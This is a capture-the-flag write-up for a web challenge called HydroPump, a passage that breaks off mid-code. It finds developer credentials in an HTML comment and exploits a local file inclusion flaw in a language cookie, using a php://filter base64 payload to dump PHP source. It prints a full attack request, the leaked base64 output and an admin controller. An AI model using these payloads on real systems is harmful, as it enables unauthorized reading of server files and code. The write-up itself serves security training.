# HydroPump

Challenge Author: Jeroen Beckers
Source files: https://s3-eu-west-1.amazonaws.com/be.cscbe.challenges.2021/hydropump_82b546c789623b051f0bd38df94c54a0/hydro.tar

# Writeup

1. Investigate the page source and find a HTML comment with login credentials for the admin panel ('lucas:devpwd')
2. The language cookie has a LFI vulnerability that lets you read sourcecode using the php base64 filter. You can find the vulnerability by putting a single quote in the lang cookie and you will get a PHP error.

```
REQUEST

GET /index.php/state/show HTTP/1.1
Host: localhost:9999
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _ga_3EL835QL4R=GS1.1.1614799094.12.1.1614799202.0; _ga=GA1.1.1442945349.1611053461; _ga_RZD5CL3CTB=GS1.1.1616610883.5.0.1616610888.0; cookieconsent_status=dismiss; lang=php://filter/convert.base64-encode/resource=index; ci_session=7dade6d71021e264743f7b17026c70a38c34d91d
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0


RESPONSE

...snip
					<!-- DEV: lucas:devpwd -->
			<form class="navbar-form pull-right" action="/index.php/main/login" method="post">
              		<input class="span2" type="text" placeholder="user" name="username">
              		<input class="span2" type="password" placeholder="password" name="password">
              		<button type="submit" class="btn">Sign in</button>
            	</form>
				
            
          </div><!--/.nav-collapse -->
        </div>
      </div>
    </div>
PD9waHAKLyoqCiAqIENvZGVJZ25pdGVyCiAqCiAqIEFuIG9wZW4gc291cmNlIGFwcGxpY2F0aW9uIGRldmVsb3BtZW50IGZyYW1ld29yayBmb3IgUEhQCiAqCiAqIFRoaXMgY29udGVudCBpcyByZWxlYXNlZCB1bmRlciB0aGUgTUlUIExpY2Vuc2UgKE1JVCkKICoKICogQ29weXJpZ2h0IChjKSAyMDE0IC0gMjAxOSwgQnJpdGlzaCBDb2x1bWJpYSBJbnN0aXR1dGUgb2YgVGVjaG5vbG9neQogKgogKiBQZXJtaXNzaW9uIGlzIGhlcmVieSBncmFudGVkLCBmcmVlIG9mIGNoYXJnZSwgdG8gYW55IHBlcnNvbiBvYnRhaW5pbmcgYSBjb3B5CiAqIG9mIHRoaXMgc29mdHdhcmUgYW5kIGFzc29jaWF0ZWQgZG9jdW1lbnRhdGlvbiBmaWxlcyAodGhlICJTb2Z0d2FyZSIpLCB0byBkZWFsCiAqIGluIHRoZSBTb2Z0d2FyZSB3aXRob3V0IHJlc3RyaWN0aW9uLCBpbmNsdWRpbmcgd2l0aG91dCBsaW1pdGF0aW9uIHRoZSByaWdodHMKICogdG8gdXNlLCBjb3B5LCBtb2RpZnksIG1lcmdlLCBwdWJsaXNoLCBkaXN0cmlidXRlLCBzdWJsaWNlbnNlLCBhbmQvb3Igc2VsbAogKiBjb3BpZXMgb2YgdGhlIFNvZnR3YXJlLCBhbmQgdG8gcGVybWl0IHBlcnNvbnMgdG8gd2hvbSB0aGUgU29mdHdhcmUgaXMKICogZnVybmlzaGVkIHRvIGRvIHNvLCBzdWJqZWN0IHRvIHRoZSBmb2xsb3dpbmcgY29uZGl0aW9uczoKICoKICogVGhlIGFib3ZlIGNvcHlyaWdodCBub3RpY2UgYW5kIHRoaXMgcGVybWlzc2lvbiBub3RpY2Ugc2hhbGwgYmUgaW5jbHVkZWQgaW4KICogYWxsIGNvcGllcyBvciBzdWJzdGFudGlhbCBwb3J0aW9ucyBvZiB0aGUgU29mdHdhcmUuCiAqCiAqIFRIRSBTT0ZUV0FSRSBJUyBQUk9WSURFRCAiQVMgSVMiLCBXSVRIT1VUIFdBUlJBTlRZIE9GIEFOWSBLSU5ELCBFWFBSRVNTIE9SCiAqIElNUExJRUQsIElOQ0xVRElORyBCVVQgTk9UIExJTUlURUQgVE8gVEhFIFdBUlJBTlRJRVMgT0YgTUVSQ0hBTlRBQklMSVRZLAogKiBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRSBBTkQgTk9OSU5GUklOR0VNRU5ULiBJTiBOTyBFVkVOVCBTSEFMTCBUSEUKICogQVVUSE9SUyBPUiBDT1BZUklHSFQgSE9MREVSUyBCRSBMSUFCTEUgRk9SIEFOWSBDTEFJTSwgREFNQUdFUyBPUiBPVEhFUgogKiBMSUFCSUxJVFksIFdIRVRIRVIgSU4gQU4gQUNUSU9OIE9GIENPTlRSQUNULCBUT1JUIE9SIE9USEVSV0lTRSwgQVJJU0lORyBGUk9NLAogKiBPVVQgT0YgT1IgSU4gQ09OTkVDVElPTiBXSVRIIFRIRSBTT0ZUV0FSRSBPUiBUSEUgVVNFIE9SIE9USEVSIERFQUxJTkdTIElOCiAqIFRIRSBTT0ZUV0FSRS4KICoKICogQHBhY2thZ2UJQ29kZUlnbml0ZXIKICogQGF1dGhvcglFbGxpc0xhYiBEZXYgVGVhbQogKiBAY29weXJpZ2h0CUNvcHlyaWdodCAoYykgMjAwOCAtIDIwMTQsIEVsbGlzTGFiLCBJbmMuIChodHRwczovL2VsbGlzbGFiLmNvbS8pCiAqIEBjb3B5cmlnaHQJQ29weXJpZ2h0IChjKSAyMDE0IC0gMjAxOSwgQnJpdGlzaCBDb2x1bWJpYSBJbnN0aXR1dGUgb2YgVGVjaG5vbG9neSAoaHR0cHM6Ly9iY2l0LmNhLykKICogQGxpY2Vuc2UJaHR0cHM6Ly9vcGVuc291cmNlLm9yZy9saWNlbnNlcy9NSVQJTUlUIExpY2Vuc2UKICogQGxpbmsJaHR0cHM6Ly9jb2RlaWduaXRlci5jb20KICogQHNpbmNlCVZlcnNpb24gMS4wLjAKICogQGZpbGVzb3VyY2UKICovCgovKgogKi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogKiBBUFBMSUNBVElPTiBFTlZJUk9OTUVOVAogKi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogKgogKiBZb3UgY2FuIGxvYWQgZGlmZmVyZW50IGNvbmZpZ3VyYXRpb25zIGRlcGVuZGluZyBvbiB5b3VyCiAqIGN1cnJlbnQgZW52aXJvbm1lbnQuIFNldHRpbmcgdGhlIGVudmlyb25tZW50IGFsc28gaW5mbHVlbmNlcwogKiB0aGluZ3MgbGlrZSBsb2dnaW5nIGFuZCBlcnJvciByZXBvcnRpbmcuCiAqCiAqIFRoaXMgY2FuIGJlIHNldCB0byBhbnl0aGluZywgYnV0IGRlZmF1bHQgdXNhZ2UgaXM6CiAqCiAqICAgICBkZXZlbG9wbWVudAogKiAgICAgdGVzdGluZwogKiAgICAgcHJvZHVjdGlvbgogKgogKiBOT1RFOiBJZiB5b3UgY2hhbmdlIHRoZXNlLCBhbHNvIGNoYW5nZSB0aGUgZXJyb3JfcmVwb3J0aW5nKCkgY29kZSBiZWxvdwogKi8KCWRlZmluZSgnRU5WSVJPTk1FTlQnLCBpc3NldCgkX1NFUlZFUlsnQ0lfRU5WJ10pID8gJF9TRVJWRVJbJ0NJX0VOViddIDogJ2RldmVsb3BtZW50Jyk7CgovKgogKi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogKiBFUlJPUiBSRVBPUlRJTkcKICotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICoKICogRGlmZmVyZW50IGVudmlyb25tZW50cyB3aWxsIHJlcXVpcmUgZGlmZmVyZW50IGxldmVscyBvZiBlcnJvciByZXBvcnRpbmcuCiAqIEJ5IGRlZmF1bHQgZGV2ZWxvcG1lbnQgd2lsbCBzaG93IGVycm9ycyBidXQgdGVzdGluZyBhbmQgbGl2ZSB3aWxsIGhpZGUgdGhlbS4KICovCnN3aXRjaCAoRU5WSVJPTk1FTlQpCnsKCWNhc2UgJ2RldmVsb3BtZW50JzoKCQllcnJvcl9yZXBvcnRpbmcoLTEpOwoJCWluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMSk7CglicmVhazsKCgljYXNlICd0ZXN0aW5nJzoKCWNhc2UgJ3Byb2R1Y3Rpb24nOgoJCWluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7CgkJaWYgKHZlcnNpb25fY29tcGFyZShQSFBfVkVSU0lPTiwgJzUuMycsICc+PScpKQoJCXsKCQkJZXJyb3JfcmVwb3J0aW5nKEVfQUxMICYgfkVfTk9USUNFICYgfkVfREVQUkVDQVRFRCAmIH5FX1NUUklDVCAmIH5FX1VTRVJfTk9USUNFICYgfkVfVVNFUl9ERVBSRUNBVEVEKTsKCQl9CgkJZWxzZQoJCXsKCQkJZXJyb3JfcmVwb3J0aW5nKEVfQUxMICYgfkVfTk9USUNFICYgfkVfU1RSSUNUICYgfkVfVVNFUl9OT1RJQ0UpOwoJCX0KCWJyZWFrOwoKCWRlZmF1bHQ6CgkJaGVhZGVyKCdIVFRQLzEuMSA1MDMgU2VydmljZSBVbmF2YWlsYWJsZS4nLCBUUlVFLCA1MDMpOwoJCWVjaG8gJ1RoZSBhcHBsaWNhdGlvbiBlbnZpcm9ubWVudCBpcyBub3Qgc2V0IGNvcnJlY3RseS4nOwoJCWV4aXQoMSk7IC8vIEVYSVRfRVJST1IKfQoKLyoKICotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICogU1lTVEVNIERJUkVDVE9SWSBOQU1FCiAqLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAqCiAqIFRoaXMgdmFyaWFibGUgbXVzdCBjb250YWluIHRoZSBuYW1lIG9mIHlvdXIgInN5c3RlbSIgZGlyZWN0b3J5LgogKiBTZXQgdGhlIHBhdGggaWYgaXQgaXMgbm90IGluIHRoZSBzYW1lIGRpcmVjdG9yeSBhcyB0aGlzIGZpbGUuCiAqLwoJJHN5c3RlbV9wYXRoID0gJ3N5c3RlbSc7CgovKgogKi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogKiBBUFBMSUNBVElPTiBESVJFQ1RPUlkgTkFNRQogKi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogKgogKiBJZiB5b3Ugd2FudCB0aGlzIGZyb250IGNvbnRyb2xsZXIgdG8gdXNlIGEgZGlmZmVyZW50ICJhcHBsaWNhdGlvbiIKICogZGlyZWN0b3J5IHRoYW4gdGhlIGRlZmF1bHQgb25lIHlvdSBjYW4gc2V0IGl0cyBuYW1lIGhlcmUuIFRoZSBkaXJlY3RvcnkKICogY2FuIGFsc28gYmUgcmVuYW1lZCBvciByZWxvY2F0ZWQgYW55d2hlcmUgb24geW91ciBzZXJ2ZXIuIElmIHlvdSBkbywKICogdXNlIGFuIGFic29sdXRlIChmdWxsKSBzZXJ2ZXIgcGF0aC4KICogRm9yIG1vcmUgaW5mbyBwbGVhc2Ugc2VlIHRoZSB1c2VyIGd1aWRlOgogKgogKiBodHRwczovL2NvZGVpZ25pdGVyLmNvbS91c2VyX2d1aWRlL2dlbmVyYWwvbWFuYWdpbmdfYXBwcy5odG1sCiAqCiAqIE5PIFRSQUlMSU5HIFNMQVNIIQogKi8KCSRhcHBsaWNhdGlvbl9mb2xkZXIgPSAnYXBwbGljYXRpb24nOwoKLyoKICotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICogVklFVyBESVJFQ1RPUlkgTkFNRQogKi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogKgogKiBJZiB5b3Ugd2FudCB0byBtb3ZlIHRoZSB2aWV3IGRpcmVjdG9yeSBvdXQgb2YgdGhlIGFwcGxpY2F0aW9uCiAqIGRpcmVjdG9yeSwgc2V0IHRoZSBwYXRoIHRvIGl0IGhlcmUuIFRoZSBkaXJlY3RvcnkgY2FuIGJlIHJlbmFtZWQKICogYW5kIHJlbG9jYXRlZCBhbnl3aGVyZSBvbiB5b3VyIHNlcnZlci4gSWYgYmxhbmssIGl0IHdpbGwgZGVmYXVsdAogKiB0byB0aGUgc3RhbmRhcmQgbG9jYXRpb24gaW5zaWRlIHlvdXIgYXBwbGljYXRpb24gZGlyZWN0b3J5LgogKiBJZiB5b3UgZG8gbW92ZSB0aGlzLCB1c2UgYW4gYWJzb2x1dGUgKGZ1bGwpIHNlcnZlciBwYXRoLgogKgogKiBOTyBUUkFJTElORyBTTEFTSCEKICovCgkkdmlld19mb2xkZXIgPSAnJzsKCgovKgogKiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogKiBERUZBVUxUIENPTlRST0xMRVIKICogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICoKICogTm9ybWFsbHkgeW91IHdpbGwgc2V0IHlvdXIgZGVmYXVsdCBjb250cm9sbGVyIGluIHRoZSByb3V0ZXMucGhwIGZpbGUuCiAqIFlvdSBjYW4sIGhvd2V2ZXIsIGZvcmNlIGEgY3VzdG9tIHJvdXRpbmcgYnkgaGFyZC1jb2RpbmcgYQogKiBzcGVjaWZpYyBjb250cm9sbGVyIGNsYXNzL2Z1bmN0aW9uIGhlcmUuIEZvciBtb3N0IGFwcGxpY2F0aW9ucywgeW91CiAqIFdJTEwgTk9UIHNldCB5b3VyIHJvdXRpbmcgaGVyZSwgYnV0IGl0J3MgYW4gb3B0aW9uIGZvciB0aG9zZQogKiBzcGVjaWFsIGluc3RhbmNlcyB3aGVyZSB5b3UgbWlnaHQgd2FudCB0byBvdmVycmlkZSB0aGUgc3RhbmRhcmQKICogcm91dGluZyBpbiBhIHNwZWNpZmljIGZyb250IGNvbnRyb2xsZXIgdGhhdCBzaGFyZXMgYSBjb21tb24gQ0kgaW5zdGFsbGF0aW9uLgogKgogKiBJTVBPUlRBTlQ6IElmIHlvdSBzZXQgdGhlIHJvdXRpbmcgaGVyZSwgTk8gT1RIRVIgY29udHJvbGxlciB3aWxsIGJlCiAqIGNhbGxhYmxlLiBJbiBlc3NlbmNlLCB0aGlzIHByZWZlcmVuY2UgbGltaXRzIHlvdXIgYXBwbGljYXRpb24gdG8gT05FCiAqIHNwZWNpZmljIGNvbnRyb2xsZXIuIExlYXZlIHRoZSBmdW5jdGlvbiBuYW1lIGJsYW5rIGlmIHlvdSBuZWVkCiAqIHRvIGNhbGwgZnVuY3Rpb25zIGR5bmFtaWNhbGx5IHZpYSB0aGUgVVJJLgogKgogKiBVbi1jb21tZW50IHRoZSAkcm91dGluZyBhcnJheSBiZWxvdyB0byB1c2UgdGhpcyBmZWF0dXJlCiAqLwoJLy8gVGhlIGRpcmVjdG9yeSBuYW1lLCByZWxhdGl2ZSB0byB0aGUgImNvbnRyb2xsZXJzIiBkaXJlY3RvcnkuICBMZWF2ZSBibGFuawoJLy8gaWYgeW91ciBjb250cm9sbGVyIGlzIG5vdCBpbiBhIHN1Yi1kaXJlY3Rvcnkgd2l0aGluIHRoZSAiY29udHJvbGxlcnMiIG9uZQoJLy8gJHJvdXRpbmdbJ2RpcmVjdG9yeSddID0gJyc7CgoJLy8gVGhlIGNvbnRyb2xsZXIgY2xhc3MgZmlsZSBuYW1lLiAgRXhhbXBsZTogIG15Y29udHJvbGxlcgoJLy8gJHJvdXRpbmdbJ2NvbnRyb2xsZXInXSA9ICcnOwoKCS8vIFRoZSBjb250cm9sbGVyIGZ1bmN0aW9uIHlvdSB3aXNoIHRvIGJlIGNhbGxlZC4KCS8vICRyb3V0aW5nWydmdW5jdGlvbiddCT0gJyc7CgoKLyoKICogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogKiAgQ1VTVE9NIENPTkZJRyBWQUxVRVMKICogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogKgogKiBUaGUgJGFzc2lnbl90b19jb25maWcgYXJyYXkgYmVsb3cgd2lsbCBiZSBwYXNzZWQgZHluYW1pY2FsbHkgdG8gdGhlCiAqIGNvbmZpZyBjbGFzcyB3aGVuIGluaXRpYWxpemVkLiBUaGlzIGFsbG93cyB5b3UgdG8gc2V0IGN1c3RvbSBjb25maWcKICogaXRlbXMgb3Igb3ZlcnJpZGUgYW55IGRlZmF1bHQgY29uZmlnIHZhbHVlcyBmb3VuZCBpbiB0aGUgY29uZmlnLnBocCBmaWxlLgogKiBUaGlzIGNhbiBiZSBoYW5keSBhcyBpdCBwZXJtaXRzIHlvdSB0byBzaGFyZSBvbmUgYXBwbGljYXRpb24gYmV0d2VlbgogKiBtdWx0aXBsZSBmcm9udCBjb250cm9sbGVyIGZpbGVzLCB3aXRoIGVhY2ggZmlsZSBjb250YWluaW5nIGRpZmZlcmVudAogKiBjb25maWcgdmFsdWVzLgogKgogKiBVbi1jb21tZW50IHRoZSAkYXNzaWduX3RvX2NvbmZpZyBhcnJheSBiZWxvdyB0byB1c2UgdGhpcyBmZWF0dXJlCiAqLwoJLy8gJGFzc2lnbl90b19jb25maWdbJ25hbWVfb2ZfY29uZmlnX2l0ZW0nXSA9ICd2YWx1ZSBvZiBjb25maWcgaXRlbSc7CgoKCi8vIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi8vIEVORCBPRiBVU0VSIENPTkZJR1VSQUJMRSBTRVRUSU5HUy4gIERPIE5PVCBFRElUIEJFTE9XIFRISVMgTElORQovLyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKLyoKICogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAqICBSZXNvbHZlIHRoZSBzeXN0ZW0gcGF0aCBmb3IgaW5jcmVhc2VkIHJlbGlhYmlsaXR5CiAqIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogKi8KCgkvLyBTZXQgdGhlIGN1cnJlbnQgZGlyZWN0b3J5IGNvcnJlY3RseSBmb3IgQ0xJIHJlcXVlc3RzCglpZiAoZGVmaW5lZCgnU1RESU4nKSkKCXsKCQljaGRpcihkaXJuYW1lKF9fRklMRV9fKSk7Cgl9CgoJaWYgKCgkX3RlbXAgPSByZWFscGF0aCgkc3lzdGVtX3BhdGgpKSAhPT0gRkFMU0UpCgl7CgkJJHN5c3RlbV9wYXRoID0gJF90ZW1wLkRJUkVDVE9SWV9TRVBBUkFUT1I7Cgl9CgllbHNlCgl7CgkJLy8gRW5zdXJlIHRoZXJlJ3MgYSB0cmFpbGluZyBzbGFzaAoJCSRzeXN0ZW1fcGF0aCA9IHN0cnRyKAoJCQlydHJpbSgkc3lzdGVtX3BhdGgsICcvXFwnKSwKCQkJJy9cXCcsCgkJCURJUkVDVE9SWV9TRVBBUkFUT1IuRElSRUNUT1JZX1NFUEFSQVRPUgoJCSkuRElSRUNUT1JZX1NFUEFSQVRPUjsKCX0KCgkvLyBJcyB0aGUgc3lzdGVtIHBhdGggY29ycmVjdD8KCWlmICggISBpc19kaXIoJHN5c3RlbV9wYXRoKSkKCXsKCQloZWFkZXIoJ0hUVFAvMS4xIDUwMyBTZXJ2aWNlIFVuYXZhaWxhYmxlLicsIFRSVUUsIDUwMyk7CgkJZWNobyAnWW91ciBzeXN0ZW0gZm9sZGVyIHBhdGggZG9lcyBub3QgYXBwZWFyIHRvIGJlIHNldCBjb3JyZWN0bHkuIFBsZWFzZSBvcGVuIHRoZSBmb2xsb3dpbmcgZmlsZSBhbmQgY29ycmVjdCB0aGlzOiAnLnBhdGhpbmZvKF9fRklMRV9fLCBQQVRISU5GT19CQVNFTkFNRSk7CgkJZXhpdCgzKTsgLy8gRVhJVF9DT05GSUcKCX0KCi8qCiAqIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICogIE5vdyB0aGF0IHdlIGtub3cgdGhlIHBhdGgsIHNldCB0aGUgbWFpbiBwYXRoIGNvbnN0YW50cwogKiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAqLwoJLy8gVGhlIG5hbWUgb2YgVEhJUyBmaWxlCglkZWZpbmUoJ1NFTEYnLCBwYXRoaW5mbyhfX0ZJTEVfXywgUEFUSElORk9fQkFTRU5BTUUpKTsKCgkvLyBQYXRoIHRvIHRoZSBzeXN0ZW0gZGlyZWN0b3J5CglkZWZpbmUoJ0JBU0VQQVRIJywgJHN5c3RlbV9wYXRoKTsKCgkvLyBQYXRoIHRvIHRoZSBmcm9udCBjb250cm9sbGVyICh0aGlzIGZpbGUpIGRpcmVjdG9yeQoJZGVmaW5lKCdGQ1BBVEgnLCBkaXJuYW1lKF9fRklMRV9fKS5ESVJFQ1RPUllfU0VQQVJBVE9SKTsKCgkvLyBOYW1lIG9mIHRoZSAic3lzdGVtIiBkaXJlY3RvcnkKCWRlZmluZSgnU1lTRElSJywgYmFzZW5hbWUoQkFTRVBBVEgpKTsKCgkvLyBUaGUgcGF0aCB0byB0aGUgImFwcGxpY2F0aW9uIiBkaXJlY3RvcnkKCWlmIChpc19kaXIoJGFwcGxpY2F0aW9uX2ZvbGRlcikpCgl7CgkJaWYgKCgkX3RlbXAgPSByZWFscGF0aCgkYXBwbGljYXRpb25fZm9sZGVyKSkgIT09IEZBTFNFKQoJCXsKCQkJJGFwcGxpY2F0aW9uX2ZvbGRlciA9ICRfdGVtcDsKCQl9CgkJZWxzZQoJCXsKCQkJJGFwcGxpY2F0aW9uX2ZvbGRlciA9IHN0cnRyKAoJCQkJcnRyaW0oJGFwcGxpY2F0aW9uX2ZvbGRlciwgJy9cXCcpLAoJCQkJJy9cXCcsCgkJCQlESVJFQ1RPUllfU0VQQVJBVE9SLkRJUkVDVE9SWV9TRVBBUkFUT1IKCQkJKTsKCQl9Cgl9CgllbHNlaWYgKGlzX2RpcihCQVNFUEFUSC4kYXBwbGljYXRpb25fZm9sZGVyLkRJUkVDVE9SWV9TRVBBUkFUT1IpKQoJewoJCSRhcHBsaWNhdGlvbl9mb2xkZXIgPSBCQVNFUEFUSC5zdHJ0cigKCQkJdHJpbSgkYXBwbGljYXRpb25fZm9sZGVyLCAnL1xcJyksCgkJCScvXFwnLAoJCQlESVJFQ1RPUllfU0VQQVJBVE9SLkRJUkVDVE9SWV9TRVBBUkFUT1IKCQkpOwoJfQoJZWxzZQoJewoJCWhlYWRlcignSFRUUC8xLjEgNTAzIFNlcnZpY2UgVW5hdmFpbGFibGUuJywgVFJVRSwgNTAzKTsKCQllY2hvICdZb3VyIGFwcGxpY2F0aW9uIGZvbGRlciBwYXRoIGRvZXMgbm90IGFwcGVhciB0byBiZSBzZXQgY29ycmVjdGx5LiBQbGVhc2Ugb3BlbiB0aGUgZm9sbG93aW5nIGZpbGUgYW5kIGNvcnJlY3QgdGhpczogJy5TRUxGOwoJCWV4aXQoMyk7IC8vIEVYSVRfQ09ORklHCgl9CgoJZGVmaW5lKCdBUFBQQVRIJywgJGFwcGxpY2F0aW9uX2ZvbGRlci5ESVJFQ1RPUllfU0VQQVJBVE9SKTsKCgkvLyBUaGUgcGF0aCB0byB0aGUgInZpZXdzIiBkaXJlY3RvcnkKCWlmICggISBpc3NldCgkdmlld19mb2xkZXJbMF0pICYmIGlzX2RpcihBUFBQQVRILid2aWV3cycuRElSRUNUT1JZX1NFUEFSQVRPUikpCgl7CgkJJHZpZXdfZm9sZGVyID0gQVBQUEFUSC4ndmlld3MnOwoJfQoJZWxzZWlmIChpc19kaXIoJHZpZXdfZm9sZGVyKSkKCXsKCQlpZiAoKCRfdGVtcCA9IHJlYWxwYXRoKCR2aWV3X2ZvbGRlcikpICE9PSBGQUxTRSkKCQl7CgkJCSR2aWV3X2ZvbGRlciA9ICRfdGVtcDsKCQl9CgkJZWxzZQoJCXsKCQkJJHZpZXdfZm9sZGVyID0gc3RydHIoCgkJCQlydHJpbSgkdmlld19mb2xkZXIsICcvXFwnKSwKCQkJCScvXFwnLAoJCQkJRElSRUNUT1JZX1NFUEFSQVRPUi5ESVJFQ1RPUllfU0VQQVJBVE9SCgkJCSk7CgkJfQoJfQoJZWxzZWlmIChpc19kaXIoQVBQUEFUSC4kdmlld19mb2xkZXIuRElSRUNUT1JZX1NFUEFSQVRPUikpCgl7CgkJJHZpZXdfZm9sZGVyID0gQVBQUEFUSC5zdHJ0cigKCQkJdHJpbSgkdmlld19mb2xkZXIsICcvXFwnKSwKCQkJJy9cXCcsCgkJCURJUkVDVE9SWV9TRVBBUkFUT1IuRElSRUNUT1JZX1NFUEFSQVRPUgoJCSk7Cgl9CgllbHNlCgl7CgkJaGVhZGVyKCdIVFRQLzEuMSA1MDMgU2VydmljZSBVbmF2YWlsYWJsZS4nLCBUUlVFLCA1MDMpOwoJCWVjaG8gJ1lvdXIgdmlldyBmb2xkZXIgcGF0aCBkb2VzIG5vdCBhcHBlYXIgdG8gYmUgc2V0IGNvcnJlY3RseS4gUGxlYXNlIG9wZW4gdGhlIGZvbGxvd2luZyBmaWxlIGFuZCBjb3JyZWN0IHRoaXM6ICcuU0VMRjsKCQlleGl0KDMpOyAvLyBFWElUX0NPTkZJRwoJfQoKCWRlZmluZSgnVklFV1BBVEgnLCAkdmlld19mb2xkZXIuRElSRUNUT1JZX1NFUEFSQVRPUik7CgovKgogKiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogKiBMT0FEIFRIRSBCT09UU1RSQVAgRklMRQogKiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogKgogKiBBbmQgYXdheSB3ZSBnby4uLgogKi8KcmVxdWlyZV9vbmNlIEJBU0VQQVRILidjb3JlL0NvZGVJZ25pdGVyLnBocCc7Cg==<div class="page-header">
            <h1>
<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

<h4>A PHP Error was encountered</h4>

<p>Severity: Warning</p>
<p>Message:  Undefined variable $statetitle</p>
<p>Filename: views/state.php
...snip

```

3. You can now see that the application uses codeigniter and figure out which page maps to the admin panel upload form (`lang=php://filter/convert.base64-encode/resource=application/controllers/Admin`)
4. The source code is:

```php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Admin extends CI_Controller {

	public function index()
	{
		$this->load->view('admin_view');
	}


	public function __construct()
	    {
		parent::__construct();
		$this->load->library('session');
		$this->load->helper('cookie');

		if(!$this->session->userdata("admin"))
		{
			header("Location: " . base_url());
		}
	    }
	
	public function view_conf()
	{
		$basedir = "/app/private/firmware_updates/";
		$dirs = array_filter(glob($basedir . "*", GLOB_ONLYDIR));
		for($i = 0; $i<sizeof($dirs); $i++)
		{
			$dir = $dirs[$i];
			$numfiles = sizeof(glob($dir . "/*"));
			$filename = substr($dirs[$i], strlen($basedir));

			$dirs[$i] = ["timestamp" => explode("-", $filename)[1], "numfiles" => $numfiles]; 
		}
		$data = array();
		$data["updates"] = $dirs;
		$this->load->view("admin_history", $data);
	}
	public function valve_control()
	{
		
		$data = [];
		$data["valves"] = $this->getRandomData();
		$this->load->view("admin_control", $data);
	}

	public function control_api()
	{
		if(rand(1, 10) > 5)
		{
			$this->output->set_output("ERROR");
		}
		$this->output->set_output("OK");
	}

	public function update()
	{
		$this->load->view("admin_upload");
	}

	public function getRandomData()
	{
		$data = array();
		for($i = 0; $i<27; $i++)
		{
			$data[$i] = array("name"=>"Valve " . $i, "pressure"=> rand(48, 100), "state"=>(rand(0, 1) == 1 ? "OPEN" : "CLOSE"));
		}

		return $data;
	}

	private function  normalizePath($path)
	{
		$parts = array();// Array to build a new path from the good parts
		$path = str_replace('\\', '/', $path);// Replace backslashes with forwardslashes
		$path = preg_replace('/\/+/', '/', $path);// Combine multiple slashes into a single slash
		$segments = explode('/', $path);// Collect path segments
		$test = '';// Initialize testing variable
		foreach($segments as $segment)
		{
			if($segment != '.')
			{
				$test = array_pop($parts);
				if(is_null($test))
					$parts[] = $segment;
